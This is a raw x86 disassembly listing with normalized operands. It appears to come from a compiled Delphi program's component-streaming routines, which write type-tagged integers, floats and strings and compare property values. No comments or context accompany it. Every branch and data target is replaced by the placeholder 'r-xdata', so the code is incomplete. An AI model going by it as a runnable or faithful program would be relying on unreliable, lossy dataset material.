call sub_420e64
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41e794
push ebp
mov ebp esp
add esp 0xfffffec8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x138 ] ecx
mov [ ebp - 0x12c ] ecx
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x134 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41eb70
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4031c0
xor ebx ebx
mov bl [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_4042a8
add ebx eax
inc ebx
add ebx 0x5
add ebx 0x3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x10 ]
cmp ebx eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e394
mov [ ebp - 0xc ] eax
mov al [ r-xdata ]
mov [ ebp - 0x25 ] al
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e4d4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
or [ ebp - 0x25 ] 0x1
or [ ebp - 0x25 ] 0x4
jmp r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
mov dl [ ebp - 0x25 ]
mov eax [ ebp - 0x4 ]
call sub_41edc4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
cmp eax [ ebx + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4031c0
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x138 ]
call sub_40424c
mov edx [ ebp - 0x138 ]
mov eax [ ebp - 0x4 ]
call sub_420438
mov eax [ ebp - 0x8 ]
call sub_4031b8
call sub_403498
call sub_4145bc
lea edx [ eax + 0xa ]
lea eax [ ebp - 0x130 ]
call sub_40424c
push [ ebp - 0x130 ]
push r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4031c0
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x134 ]
call sub_40424c
push [ ebp - 0x134 ]
lea eax [ ebp - 0x12c ]
mov edx 0x3
call sub_404368
mov edx [ ebp - 0x12c ]
mov eax [ ebp - 0x4 ]
call sub_420438
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
or [ ebp - 0x25 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41ee08
mov eax [ ebp - 0x4 ]
call sub_41edbc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_41eb11
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x34 ]
cmp edx [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_420438
mov eax [ ebp - 0x4 ]
call sub_41e394
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
or [ ebp - 0x25 ] 0x2
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_418550
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x20 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eb18
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x1c ]
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x28 ] edx
retn
xor eax eax
push ebp
push sub_41eacf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
push eax
push sub_41e640
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov si 0xfffd
call sub_40346c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_403270
retn
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
mov eax [ ebp - 0x4 ]
push eax
push sub_41e334
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov si 0xfffd
call sub_40346c
test [ ebx + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] ebx
sub_41eb18
mov eax [ ebp - 0x4 ]
call sub_41edbc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eb77
lea eax [ ebp - 0x138 ]
mov edx 0x4
call sub_40400c
retn
mov al [ r-xdata ]
cmp al [ ebp - 0x25 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e394
mov edx [ ebp - 0x10 ]
add edx 0x2
cmp eax edx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41e3ac
sub_41eb94
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x5
mov eax ebx
call sub_420620
lea edx [ ebp + 0x8 ]
mov ecx 0xa
mov eax ebx
call sub_41e400
pop ebx
pop ebp
retn 0xc
sub_41ebb8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0xf
mov eax ebx
call sub_420620
lea edx [ ebp + 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41e400
pop ebx
pop ebp
retn 0x4
sub_41ebdc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x10
mov eax ebx
call sub_420620
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41e400
pop ebx
pop ebp
retn 0x8
sub_41ec00
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x11
mov eax ebx
call sub_420620
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41e400
pop ebx
pop ebp
retn 0x8
sub_41ec24
push ebx
push esi
mov esi edx
mov ebx eax
mov edx r-xdata
mov eax esi
call sub_407ee0
test al al
je r-xdata
mov edx r-xdata
mov eax esi
call sub_407ee0
test al al
je r-xdata
mov dl 0x8
mov eax ebx
call sub_420620
pop esi
pop ebx
retn
mov edx r-xdata
mov eax esi
call sub_407ee0
test al al
je r-xdata
mov dl 0x9
mov eax ebx
call sub_420620
jmp r-xdata
mov edx r-xdata
mov eax esi
call sub_407ee0
test al al
je r-xdata
xor edx edx
mov eax ebx
call sub_420620
jmp r-xdata
pop esi
pop ebx
retn
mov dl 0x7
mov eax ebx
call sub_420620
mov edx esi
mov eax ebx
call sub_420438
mov dl 0xd
mov eax ebx
call sub_420620
jmp r-xdata
sub_41ece8
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_420620
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41e400
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_420620
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41e400
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_420620
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_41e400
jmp r-xdata
pop edx
pop ebx
retn
sub_41ed5c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov dl 0x13
mov eax ebx
call sub_420620
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41e400
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ebx
call sub_41ece8
jmp r-xdata
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_41edc4
push ebx
push esi
push ecx
mov esi ecx
mov [ esp ] dl
mov ebx eax
mov al [ r-xdata ]
cmp al [ esp ]
je r-xdata
pop edx
pop esi
pop ebx
retn
mov al [ esp ]
or al 0xf0
mov [ esp + 0x1 ] al
lea edx [ esp + 0x1 ]
mov ecx 0x1
mov eax ebx
call sub_41e400
test [ esp ] 0x2
je r-xdata
mov edx esi
mov eax ebx
call sub_41ece8
sub_41ee08
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_403498
call sub_4145bc
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
shl eax 0x2
call sub_4026f4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41eeb5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_403498
mov edx [ ebp - 0x10 ]
call sub_4147c0
mov esi [ ebp - 0xc ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0xc ]
shl edx 0x2
mov eax [ ebp - 0x10 ]
call sub_402714
retn
inc esi
xor edi edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_414814
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41fe9c
mov eax [ ebp - 0x10 ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
sub_41eed0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4031b8
mov edx eax
mov eax [ edi ]
call sub_403484
test al al
jne r-xdata
mov al 0x1
sub_41ef00
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414844
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax 0x80000000
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414844
cmp ebx eax
sete al
pop ebx
pop ebp
retn
xor eax eax
jmp r-xdata
cmp eax ebx
je r-xdata
pop ebx
pop ebp
retn
mov al 0x1
sub_41ef58
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414d74
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
sete al
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414d74
fld [ ebp - 0x10 ]
fcompp
fnstsw ax
sahf
sete al
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_41efb4
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415190
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415190
cmp edx [ ebp - 0x4 ]
jne r-xdata
sete al
cmp [ ebp - 0x8 ] 0x0
sete al
jmp r-xdata
cmp eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_41f00c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41f08b
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414bb8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_404840
sete bl
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414bb8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_404840
sete bl
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f092
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4046e0
retn
sub_41f09c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
pop esi
pop ebx
pop ebp
retn
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407ee0
test al al
jne r-xdata
mov al 0x1
sub_41f0dc
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
sete al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414844
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
call sub_41f09c
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
sub_41f134
push ebp
mov ebp esp
push ecx
push ebx
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414844
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
push ebp
call sub_41f0dc
pop ecx
test al al
jne r-xdata
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
push ebp
call sub_41f0dc
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
sub_41f1b4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41f260
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
sete bl
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f267
lea eax [ ebp - 0x8 ]
call sub_4058a8
lea eax [ ebp - 0x4 ]
call sub_4058a8
retn
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4151f4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebp - 0x4 ]
sete bl
test bl bl
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_4058a8
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40cfa0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_41f09c
pop ecx
mov ebx eax
sub_41f280
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_41f33d
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4151f4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_4058a8
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40cfa0
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f344
lea eax [ ebp - 0x10 ]
call sub_4058a8
lea eax [ ebp - 0xc ]
call sub_4058a8
lea eax [ ebp - 0x4 ]
call sub_4058a8
retn
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4151f4
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
call sub_41f1b4
pop ecx
test al al
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
sub_41f35c
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415118
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp ebx [ ebp - 0x8 ]
je r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415118
mov ebx [ ebp - 0x10 ]
mov al 0x1
mov esi [ ebp - 0x8 ]
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x110 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov eax [ eax ]
mov edx esi
call sub_40352c
cmp [ ebp - 0x110 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f3d4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_41f45b
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415098
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
call sub_413d40
mov ebx eax
lea ecx [ ebp - 0x20 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415098
lea edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_413db4
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f462
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a64
retn
sub_41f46c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_41eed0
mov [ ebp - 0x9 ] al
mov bl 0x1
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
jmp [ eax * 4 + jump_table_41f52e ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414844
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
push ebp
call sub_41ef00
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41ef58
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f00c
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f134
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f35c
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f3d4
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41efb4
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f280
pop ecx
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414844
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41f5d4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41f61c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_40424c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4203e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f623
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_41f628
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_41f6ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_4145bc
mov eax [ eax + 0x1 ]
mov edi [ eax ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xb
call sub_420620
xor ebx ebx
jae r-xdata
bt esi eax
inc ebx
cmp ebx 0x20
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_4145c8
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_420438
mov eax ebx
cmp eax 0x1f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
call sub_420438
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f6b5
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_41f6bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
xor edx edx
push ebp
push sub_41f71c
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_417d3c
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41ece8
lea edx [ ebp - 0x4 ]
mov eax esi
call ebx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_41ec24
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f723
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_41f728
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41f7be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
call sub_41f5d4
pop ecx
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_404080
xor eax eax
push ebp
push sub_41f7a1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
call sub_403fe8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41e550
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f7a8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0x4 ]
call sub_40403c
retn
sub_41f7cc
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_41f880
push [ fs : eax ]
mov [ fs : eax ] esp
